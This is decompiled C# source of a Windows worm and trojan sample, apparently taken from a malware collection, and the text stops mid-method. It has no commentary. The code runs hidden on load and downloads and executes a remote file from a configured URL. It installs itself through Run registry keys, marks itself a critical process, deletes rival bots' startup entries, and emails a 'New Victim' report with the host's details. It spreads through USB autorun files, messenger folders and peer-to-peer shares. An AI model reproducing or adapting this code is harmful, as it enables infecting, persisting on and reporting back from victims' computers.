// Decompiled with JetBrains decompiler
// Type: datav.Form1
// Assembly: datav, Version=1.2.3.1, Culture=neutral, PublicKeyToken=null
// MVID: AEFC49D5-8E51-4224-88C0-0BCEB5E90DCA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Trojan-Ransom.Win32.DoubleEagle.iv-946904aa54ee066d28e5ee8fab4b96683233d63630a2fbd4be701a262c3ced53.exe

using datav.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace datav
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("TextBox2")]
    private TextBox _TextBox2;
    [AccessedThroughProperty("TextBox3")]
    private TextBox _TextBox3;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("TextBox4")]
    private TextBox _TextBox4;
    [AccessedThroughProperty("TextBox6")]
    private TextBox _TextBox6;
    [AccessedThroughProperty("TextBox5")]
    private TextBox _TextBox5;
    [AccessedThroughProperty("TextBox7")]
    private TextBox _TextBox7;
    [AccessedThroughProperty("TextBox8")]
    private TextBox _TextBox8;
    [AccessedThroughProperty("TextBox9")]
    private TextBox _TextBox9;
    [AccessedThroughProperty("TextBox10")]
    private TextBox _TextBox10;
    [AccessedThroughProperty("TextBox11")]
    private TextBox _TextBox11;
    [AccessedThroughProperty("TextBox12")]
    private TextBox _TextBox12;
    [AccessedThroughProperty("TextBox13")]
    private TextBox _TextBox13;
    [AccessedThroughProperty("TextBox14")]
    private TextBox _TextBox14;
    [AccessedThroughProperty("TextBox15")]
    private TextBox _TextBox15;
    [AccessedThroughProperty("TextBox16")]
    private TextBox _TextBox16;
    [AccessedThroughProperty("TextBox17")]
    private TextBox _TextBox17;
    [AccessedThroughProperty("TextBox18")]
    private TextBox _TextBox18;
    [AccessedThroughProperty("TextBox19")]
    private TextBox _TextBox19;
    [AccessedThroughProperty("TextBox20")]
    private TextBox _TextBox20;
    [AccessedThroughProperty("TextBox21")]
    private TextBox _TextBox21;
    [AccessedThroughProperty("TextBox22")]
    private TextBox _TextBox22;
    [AccessedThroughProperty("TextBox23")]
    private TextBox _TextBox23;
    [AccessedThroughProperty("TextBox24")]
    private TextBox _TextBox24;
    [AccessedThroughProperty("TextBox25")]
    private TextBox _TextBox25;
    [AccessedThroughProperty("TextBox26")]
    private TextBox _TextBox26;
    private string statuscritique;
    private string botkill;
    private string libri;
    private string downlibri;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.TextBox1 = new TextBox();
      this.TextBox2 = new TextBox();
      this.TextBox3 = new TextBox();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.TextBox4 = new TextBox();
      this.TextBox6 = new TextBox();
      this.TextBox5 = new TextBox();
      this.TextBox7 = new TextBox();
      this.TextBox8 = new TextBox();
      this.TextBox9 = new TextBox();
      this.TextBox10 = new TextBox();
      this.TextBox11 = new TextBox();
      this.TextBox12 = new TextBox();
      this.TextBox13 = new TextBox();
      this.TextBox14 = new TextBox();
      this.TextBox15 = new TextBox();
      this.TextBox16 = new TextBox();
      this.TextBox17 = new TextBox();
      this.TextBox18 = new TextBox();
      this.TextBox19 = new TextBox();
      this.TextBox20 = new TextBox();
      this.TextBox21 = new TextBox();
      this.TextBox22 = new TextBox();
      this.TextBox23 = new TextBox();
      this.TextBox24 = new TextBox();
      this.TextBox25 = new TextBox();
      this.TextBox26 = new TextBox();
      this.SuspendLayout();
      TextBox textBox1_1 = this.TextBox1;
      Point point1 = new Point(12, 2);
      Point point2 = point1;
      textBox1_1.Location = point2;
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1_2 = this.TextBox1;
      Size size1 = new Size(100, 20);
      Size size2 = size1;
      textBox1_2.Size = size2;
      this.TextBox1.TabIndex = 0;
      TextBox textBox2_1 = this.TextBox2;
      point1 = new Point(12, 41);
      Point point3 = point1;
      textBox2_1.Location = point3;
      this.TextBox2.Name = "TextBox2";
      TextBox textBox2_2 = this.TextBox2;
      size1 = new Size(100, 20);
      Size size3 = size1;
      textBox2_2.Size = size3;
      this.TextBox2.TabIndex = 1;
      TextBox textBox3_1 = this.TextBox3;
      point1 = new Point(12, 80);
      Point point4 = point1;
      textBox3_1.Location = point4;
      this.TextBox3.Name = "TextBox3";
      TextBox textBox3_2 = this.TextBox3;
      size1 = new Size(100, 20);
      Size size4 = size1;
      textBox3_2.Size = size4;
      this.TextBox3.TabIndex = 2;
      TextBox textBox4_1 = this.TextBox4;
      point1 = new Point(100, 106);
      Point point5 = point1;
      textBox4_1.Location = point5;
      this.TextBox4.Name = "TextBox4";
      TextBox textBox4_2 = this.TextBox4;
      size1 = new Size(100, 20);
      Size size5 = size1;
      textBox4_2.Size = size5;
      this.TextBox4.TabIndex = 3;
      TextBox textBox6_1 = this.TextBox6;
      point1 = new Point(131, 80);
      Point point6 = point1;
      textBox6_1.Location = point6;
      this.TextBox6.Name = "TextBox6";
      TextBox textBox6_2 = this.TextBox6;
      size1 = new Size(100, 20);
      Size size6 = size1;
      textBox6_2.Size = size6;
      this.TextBox6.TabIndex = 4;
      TextBox textBox5_1 = this.TextBox5;
      point1 = new Point(-30, 106);
      Point point7 = point1;
      textBox5_1.Location = point7;
      this.TextBox5.Name = "TextBox5";
      TextBox textBox5_2 = this.TextBox5;
      size1 = new Size(100, 20);
      Size size7 = size1;
      textBox5_2.Size = size7;
      this.TextBox5.TabIndex = 5;
      TextBox textBox7_1 = this.TextBox7;
      point1 = new Point(106, 160);
      Point point8 = point1;
      textBox7_1.Location = point8;
      this.TextBox7.Name = "TextBox7";
      TextBox textBox7_2 = this.TextBox7;
      size1 = new Size(100, 20);
      Size size8 = size1;
      textBox7_2.Size = size8;
      this.TextBox7.TabIndex = 6;
      TextBox textBox8_1 = this.TextBox8;
      point1 = new Point(0, 149);
      Point point9 = point1;
      textBox8_1.Location = point9;
      this.TextBox8.Name = "TextBox8";
      TextBox textBox8_2 = this.TextBox8;
      size1 = new Size(100, 20);
      Size size9 = size1;
      textBox8_2.Size = size9;
      this.TextBox8.TabIndex = 7;
      TextBox textBox9_1 = this.TextBox9;
      point1 = new Point(106, 12);
      Point point10 = point1;
      textBox9_1.Location = point10;
      this.TextBox9.Name = "TextBox9";
      TextBox textBox9_2 = this.TextBox9;
      size1 = new Size(100, 20);
      Size size10 = size1;
      textBox9_2.Size = size10;
      this.TextBox9.TabIndex = 8;
      TextBox textBox10_1 = this.TextBox10;
      point1 = new Point(85, 54);
      Point point11 = point1;
      textBox10_1.Location = point11;
      this.TextBox10.Name = "TextBox10";
      TextBox textBox10_2 = this.TextBox10;
      size1 = new Size(100, 20);
      Size size11 = size1;
      textBox10_2.Size = size11;
      this.TextBox10.TabIndex = 9;
      TextBox textBox11_1 = this.TextBox11;
      point1 = new Point(76, 121);
      Point point12 = point1;
      textBox11_1.Location = point12;
      this.TextBox11.Name = "TextBox11";
      TextBox textBox11_2 = this.TextBox11;
      size1 = new Size(100, 20);
      Size size12 = size1;
      textBox11_2.Size = size12;
      this.TextBox11.TabIndex = 10;
      TextBox textBox12_1 = this.TextBox12;
      point1 = new Point(0, 0);
      Point point13 = point1;
      textBox12_1.Location = point13;
      this.TextBox12.Name = "TextBox12";
      TextBox textBox12_2 = this.TextBox12;
      size1 = new Size(100, 20);
      Size size13 = size1;
      textBox12_2.Size = size13;
      this.TextBox12.TabIndex = 11;
      TextBox textBox13_1 = this.TextBox13;
      point1 = new Point(85, 38);
      Point point14 = point1;
      textBox13_1.Location = point14;
      this.TextBox13.Name = "TextBox13";
      TextBox textBox13_2 = this.TextBox13;
      size1 = new Size(100, 20);
      Size size14 = size1;
      textBox13_2.Size = size14;
      this.TextBox13.TabIndex = 12;
      TextBox textBox14_1 = this.TextBox14;
      point1 = new Point(0, 0);
      Point point15 = point1;
      textBox14_1.Location = point15;
      this.TextBox14.Name = "TextBox14";
      TextBox textBox14_2 = this.TextBox14;
      size1 = new Size(100, 20);
      Size size15 = size1;
      textBox14_2.Size = size15;
      this.TextBox14.TabIndex = 13;
      TextBox textBox15_1 = this.TextBox15;
      point1 = new Point(25, 80);
      Point point16 = point1;
      textBox15_1.Location = point16;
      this.TextBox15.Name = "TextBox15";
      TextBox textBox15_2 = this.TextBox15;
      size1 = new Size(100, 20);
      Size size16 = size1;
      textBox15_2.Size = size16;
      this.TextBox15.TabIndex = 14;
      TextBox textBox16_1 = this.TextBox16;
      point1 = new Point(0, 0);
      Point point17 = point1;
      textBox16_1.Location = point17;
      this.TextBox16.Name = "TextBox16";
      TextBox textBox16_2 = this.TextBox16;
      size1 = new Size(100, 20);
      Size size17 = size1;
      textBox16_2.Size = size17;
      this.TextBox16.TabIndex = 15;
      TextBox textBox17_1 = this.TextBox17;
      point1 = new Point(8, 8);
      Point point18 = point1;
      textBox17_1.Location = point18;
      this.TextBox17.Name = "TextBox17";
      TextBox textBox17_2 = this.TextBox17;
      size1 = new Size(100, 20);
      Size size18 = size1;
      textBox17_2.Size = size18;
      this.TextBox17.TabIndex = 16;
      TextBox textBox18_1 = this.TextBox18;
      point1 = new Point(16, 16);
      Point point19 = point1;
      textBox18_1.Location = point19;
      this.TextBox18.Name = "TextBox18";
      TextBox textBox18_2 = this.TextBox18;
      size1 = new Size(100, 20);
      Size size19 = size1;
      textBox18_2.Size = size19;
      this.TextBox18.TabIndex = 17;
      TextBox textBox19_1 = this.TextBox19;
      point1 = new Point(0, 0);
      Point point20 = point1;
      textBox19_1.Location = point20;
      this.TextBox19.Name = "TextBox19";
      TextBox textBox19_2 = this.TextBox19;
      size1 = new Size(100, 20);
      Size size20 = size1;
      textBox19_2.Size = size20;
      this.TextBox19.TabIndex = 18;
      TextBox textBox20_1 = this.TextBox20;
      point1 = new Point(0, 0);
      Point point21 = point1;
      textBox20_1.Location = point21;
      this.TextBox20.Name = "TextBox20";
      TextBox textBox20_2 = this.TextBox20;
      size1 = new Size(100, 20);
      Size size21 = size1;
      textBox20_2.Size = size21;
      this.TextBox20.TabIndex = 19;
      TextBox textBox21_1 = this.TextBox21;
      point1 = new Point(8, 8);
      Point point22 = point1;
      textBox21_1.Location = point22;
      this.TextBox21.Name = "TextBox21";
      TextBox textBox21_2 = this.TextBox21;
      size1 = new Size(100, 20);
      Size size22 = size1;
      textBox21_2.Size = size22;
      this.TextBox21.TabIndex = 20;
      TextBox textBox22_1 = this.TextBox22;
      point1 = new Point(0, 0);
      Point point23 = point1;
      textBox22_1.Location = point23;
      this.TextBox22.Name = "TextBox22";
      TextBox textBox22_2 = this.TextBox22;
      size1 = new Size(100, 20);
      Size size23 = size1;
      textBox22_2.Size = size23;
      this.TextBox22.TabIndex = 21;
      TextBox textBox23_1 = this.TextBox23;
      point1 = new Point(0, 0);
      Point point24 = point1;
      textBox23_1.Location = point24;
      this.TextBox23.Name = "TextBox23";
      TextBox textBox23_2 = this.TextBox23;
      size1 = new Size(100, 20);
      Size size24 = size1;
      textBox23_2.Size = size24;
      this.TextBox23.TabIndex = 22;
      TextBox textBox24_1 = this.TextBox24;
      point1 = new Point(0, 0);
      Point point25 = point1;
      textBox24_1.Location = point25;
      this.TextBox24.Name = "TextBox24";
      TextBox textBox24_2 = this.TextBox24;
      size1 = new Size(100, 20);
      Size size25 = size1;
      textBox24_2.Size = size25;
      this.TextBox24.TabIndex = 23;
      TextBox textBox25_1 = this.TextBox25;
      point1 = new Point(0, 0);
      Point point26 = point1;
      textBox25_1.Location = point26;
      this.TextBox25.Name = "TextBox25";
      TextBox textBox25_2 = this.TextBox25;
      size1 = new Size(100, 20);
      Size size26 = size1;
      textBox25_2.Size = size26;
      this.TextBox25.TabIndex = 24;
      TextBox textBox26_1 = this.TextBox26;
      point1 = new Point(0, 0);
      Point point27 = point1;
      textBox26_1.Location = point27;
      this.TextBox26.Name = "TextBox26";
      TextBox textBox26_2 = this.TextBox26;
      size1 = new Size(100, 20);
      Size size27 = size1;
      textBox26_2.Size = size27;
      this.TextBox26.TabIndex = 25;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(104, 87);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.TextBox26);
      this.Controls.Add((Control) this.TextBox25);
      this.Controls.Add((Control) this.TextBox24);
      this.Controls.Add((Control) this.TextBox23);
      this.Controls.Add((Control) this.TextBox22);
      this.Controls.Add((Control) this.TextBox21);
      this.Controls.Add((Control) this.TextBox20);
      this.Controls.Add((Control) this.TextBox19);
      this.Controls.Add((Control) this.TextBox18);
      this.Controls.Add((Control) this.TextBox17);
      this.Controls.Add((Control) this.TextBox16);
      this.Controls.Add((Control) this.TextBox15);
      this.Controls.Add((Control) this.TextBox14);
      this.Controls.Add((Control) this.TextBox13);
      this.Controls.Add((Control) this.TextBox12);
      this.Controls.Add((Control) this.TextBox11);
      this.Controls.Add((Control) this.TextBox10);
      this.Controls.Add((Control) this.TextBox9);
      this.Controls.Add((Control) this.TextBox8);
      this.Controls.Add((Control) this.TextBox7);
      this.Controls.Add((Control) this.TextBox5);
      this.Controls.Add((Control) this.TextBox6);
      this.Controls.Add((Control) this.TextBox4);
      this.Controls.Add((Control) this.TextBox3);
      this.Controls.Add((Control) this.TextBox2);
      this.Controls.Add((Control) this.TextBox1);
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual TextBox TextBox1
    {
      get => this._TextBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual TextBox TextBox2
    {
      get => this._TextBox2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox2 = value;
    }

    internal virtual TextBox TextBox3
    {
      get => this._TextBox3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox3 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      get => this._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Timer1 = value;
    }

    internal virtual TextBox TextBox4
    {
      get => this._TextBox4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox4 = value;
    }

    internal virtual TextBox TextBox6
    {
      get => this._TextBox6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox6 = value;
    }

    internal virtual TextBox TextBox5
    {
      get => this._TextBox5;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox5 = value;
    }

    internal virtual TextBox TextBox7
    {
      get => this._TextBox7;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox7 = value;
    }

    internal virtual TextBox TextBox8
    {
      get => this._TextBox8;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox8 = value;
    }

    internal virtual TextBox TextBox9
    {
      get => this._TextBox9;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox9 = value;
    }

    internal virtual TextBox TextBox10
    {
      get => this._TextBox10;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox10 = value;
    }

    internal virtual TextBox TextBox11
    {
      get => this._TextBox11;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox11 = value;
    }

    internal virtual TextBox TextBox12
    {
      get => this._TextBox12;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox12 = value;
    }

    internal virtual TextBox TextBox13
    {
      get => this._TextBox13;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox13 = value;
    }

    internal virtual TextBox TextBox14
    {
      get => this._TextBox14;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox14 = value;
    }

    internal virtual TextBox TextBox15
    {
      get => this._TextBox15;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox15 = value;
    }

    internal virtual TextBox TextBox16
    {
      get => this._TextBox16;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox16 = value;
    }

    internal virtual TextBox TextBox17
    {
      get => this._TextBox17;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox17 = value;
    }

    internal virtual TextBox TextBox18
    {
      get => this._TextBox18;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox18 = value;
    }

    internal virtual TextBox TextBox19
    {
      get => this._TextBox19;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox19 = value;
    }

    internal virtual TextBox TextBox20
    {
      get => this._TextBox20;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox20 = value;
    }

    internal virtual TextBox TextBox21
    {
      get => this._TextBox21;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox21 = value;
    }

    internal virtual TextBox TextBox22
    {
      get => this._TextBox22;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox22 = value;
    }

    internal virtual TextBox TextBox23
    {
      get => this._TextBox23;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox23 = value;
    }

    internal virtual TextBox TextBox24
    {
      get => this._TextBox24;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox24 = value;
    }

    internal virtual TextBox TextBox25
    {
      get => this._TextBox25;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox25 = value;
    }

    internal virtual TextBox TextBox26
    {
      get => this._TextBox26;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox26 = value;
    }

    private static int NtSetInformationProcess(
      IntPtr hProcess,
      int processInformationClass,
      ref int processInformation,
      int processInformationLength)
    {
      int num;
      return num;
    }

    public void LOL()
    {
      try
      {
        string Expression = System.IO.File.ReadAllText(Application.ExecutablePath);
        if (!Expression.Contains("FileSplit"))
          return;
        string[] strArray = Strings.Split(Expression, "FileSplit");
        int num1 = Information.UBound((Array) strArray);
        int num2 = 1;
        while (num2 <= num1)
        {
          this.TextBox1.Text = strArray[1];
          this.TextBox2.Text = strArray[2];
          this.TextBox3.Text = strArray[3];
          this.TextBox6.Text = strArray[4];
          this.TextBox5.Text = strArray[5];
          this.TextBox7.Text = strArray[6];
          this.TextBox8.Text = strArray[7];
          this.TextBox9.Text = strArray[8];
          this.TextBox12.Text = strArray[9];
          this.TextBox13.Text = strArray[10];
          this.TextBox14.Text = strArray[11];
          this.TextBox15.Text = strArray[12];
          this.TextBox16.Text = strArray[13];
          this.TextBox17.Text = strArray[14];
          this.TextBox18.Text = strArray[15];
          this.TextBox19.Text = strArray[16];
          this.TextBox20.Text = strArray[17];
          this.TextBox21.Text = strArray[18];
          this.TextBox22.Text = strArray[19];
          this.TextBox23.Text = strArray[20];
          this.TextBox24.Text = strArray[21];
          this.TextBox25.Text = strArray[22];
          this.TextBox26.Text = strArray[23];
          this.statuscritique = strArray[24];
          this.botkill = strArray[25];
          this.libri = strArray[26];
          this.downlibri = strArray[27];
          checked { ++num2; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void pizaa()
    {
      if (System.IO.File.Exists(this.TextBox2.Text + this.TextBox3.Text))
        System.IO.File.Delete(this.TextBox2.Text + this.TextBox3.Text);
      try
      {
        MyProject.Computer.Network.DownloadFile(this.TextBox1.Text, this.TextBox2.Text + this.TextBox3.Text);
        Process.Start(this.TextBox2.Text + this.TextBox3.Text);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void Installs()
    {
      if (Operators.CompareString(this.TextBox6.Text, "1", false) == 0)
      {
        System.IO.File.Copy(Application.ExecutablePath, "C:\\Windows\\Temp\\" + this.TextBox5.Text + ".exe");
        try
        {
          RegistryKey subKey = MyProject.Computer.Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
          subKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
          subKey.SetValue(this.TextBox5.Text, (object) ("C:\\Windows\\Temp\\" + this.TextBox5.Text + ".exe"));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(this.TextBox7.Text, "1", false) == 0)
      {
        System.IO.File.Copy(Application.ExecutablePath, "C:\\Windows\\" + this.TextBox5.Text + ".exe");
        try
        {
          RegistryKey subKey = MyProject.Computer.Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
          subKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
          subKey.SetValue(this.TextBox5.Text, (object) ("C:\\Windows\\" + this.TextBox5.Text + ".exe"));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(this.TextBox8.Text, "1", false) != 0)
        return;
      System.IO.File.Copy(Application.ExecutablePath, "C:\\Windows\\System32\\" + this.TextBox5.Text + ".exe");
      try
      {
        RegistryKey subKey = MyProject.Computer.Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
        subKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        subKey.SetValue(this.TextBox5.Text, (object) ("C:\\Windows\\System32\\" + this.TextBox5.Text + ".exe"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void critiqueprocess()
    {
      if (Operators.CompareString(this.statuscritique, "1", false) != 0)
        return;
      Process.EnterDebugMode();
      IntPtr handle = Process.GetCurrentProcess().Handle;
      int num = 1;
      ref int local = ref num;
      Form1.NtSetInformationProcess(handle, 29, ref local, 4);
    }

    public void dlllibrairy()
    {
      if (Operators.CompareString(this.libri, "1", false) != 0)
        return;
      MyProject.Computer.Network.DownloadFile(this.downlibri, "C:\\WINDOWS\\system32\\Mozsqlite3.dll");
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      try
      {
        this.LOL();
        this.botkills();
        this.pizaa();
        this.EmailN();
        this.Installs();
        this.critiqueprocess();
        this.botkills();
        this.persit();
        this.CacherFichier();
        this.USB();
        this.LAN();
        this.MSkypeS();
        this.Yahoo();
        this.P2P();
        this.MSN();
        this.FBWall(this.TextBox15.Text);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void botkillv()
    {
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).DeleteValue("Windows Update");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).DeleteValue("Winupdate");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).DeleteValue("svchost");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).DeleteValue("javaw");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).DeleteValue("Audio");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).DeleteValue("DarkCometRAT");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).DeleteValue("msnmsgsr");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).DeleteValue("DanyHost");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).DeleteValue("Updater");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).DeleteValue("winlogon");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").DeleteValue("winupdater");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").DeleteValue("explorer");
    }

    public void botkills()
    {
      if (Operators.CompareString(this.botkill, "1", false) != 0)
        return;
      this.botkillv();
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void Yahoo()
    {
      if (Operators.CompareString(this.TextBox26.Text, "1", false) != 0)
        return;
      try
      {
        Module module = Assembly.GetExecutingAssembly().GetModules()[0];
        string executablePath = Application.ExecutablePath;
        string str = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Yahoo Messenger\\";
        if (Operators.CompareString(FileSystem.Dir(str, FileAttribute.Directory), "", false) == 0)
          return;
        string[] directories = Directory.GetDirectories(str);
        int upperBound = directories.GetUpperBound(0);
        int index = 0;
        while (index <= upperBound)
        {
          if (Operators.CompareString(FileSystem.Dir(directories[index], FileAttribute.Directory), "", false) != 0 && !System.IO.File.Exists(directories[index] + "\\ys.scr"))
            System.IO.File.Copy(executablePath, directories[index] + "\\ys.scr");
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void P2P()
    {
      if (Operators.CompareString(this.TextBox17.Text, "1", false) != 0)
        return;
      try
      {
        System.IO.File.Copy(Application.ExecutablePath, Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\LimeWire\\", "Shared", (object) 0)) + "porno-movie.scr");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        System.IO.File.Copy(Application.ExecutablePath, Interaction.Environ("programfiles\\Shared\\" + "porno-movie.scr"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void EmailN()
    {
      try
      {
        if (Operators.CompareString(this.TextBox22.Text, "0", false) != 0)
          ;
        if (System.IO.File.Exists("C:\\WINDOWS\\Temp\\internet.txt"))
          this.TextBox22.Text = "0";
        if (Operators.CompareString(this.TextBox22.Text, "1", false) != 0)
          return;
        new SmtpClient("smtp.live.com")
        {
          Port = Conversions.ToInteger(this.TextBox25.Text),
          Credentials = ((ICredentialsByHost) new NetworkCredential(this.TextBox24.Text, this.TextBox23.Text)),
          EnableSsl = true
        }.Send(new MailMessage()
        {
          From = new MailAddress(this.TextBox24.Text),
          To = {
            this.TextBox24.Text
          },
          Subject = "+---New Victim !---+" + MyProject.Computer.Name,
          Body = "[Diablo Worm /+\\ New Victim !]\r\n\r\nComputer Name:    " + MyProject.Computer.Name + "\r\nOS:    " + MyProject.Computer.Info.OSFullName + "\r\nRAM:    "
        });
        new StreamWriter("C:\\WINDOWS\\Tempinternet.txt").Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void USB()
    {
      if (Operators.CompareString(this.TextBox12.Text, "1", false) != 0)
        return;
      try
      {
        string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          try
          {
            System.IO.File.Copy(Application.ExecutablePath, str + "black.scr");
            StreamWriter streamWriter = new StreamWriter(str + "\\autorun.inf");
            streamWriter.WriteLine("[autorun]");
            streamWriter.WriteLine("open=" + str + "black.scr");
            streamWriter.WriteLine("shellexecute=" + str, (object) 1);
            streamWriter.Close();
            System.IO.File.SetAttributes(str + "autorun.inf", FileAttributes.Hidden);
            System.IO.File.SetAttributes(str + "black.scr", FileAttributes.Hidden);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void MSN()
    {
      Module module = Assembly.GetExecutingAssembly().GetModules()[0];
      string executablePath = Application.ExecutablePath;
      string str = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Microsoft\\Messenger\\";
      if (Operators.CompareString(FileSystem.Dir(str, FileAttribute.Directory), "", false) == 0)
        return;
      string[] directories = Directory.GetDirectories(str);
      int upperBound = directories.GetUpperBound(0);
      int index = 0;
      while (index <= upperBound)
      {
        if (Operators.CompareString(FileSystem.Dir(directories[index], FileAttribute.Directory), "", false) != 0 && !System.IO.File.Exists(directories[index] + "\\picture.scr"))
          System.IO.File.Copy(executablePath, directories[index] + "\\picture.scr");
        checked { ++index; }
      }
    }

    public void LAN()
    {
      if (Operators.CompareString(this.TextBox13.Text, "1", false) != 0)
        ;
    }

    public void MSkypeS()
    {
      if (Operators.CompareString(this.TextBox14.Text, "1", false) != 0)
        return;
      object objectValue1 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Skype4COM.Skype"));
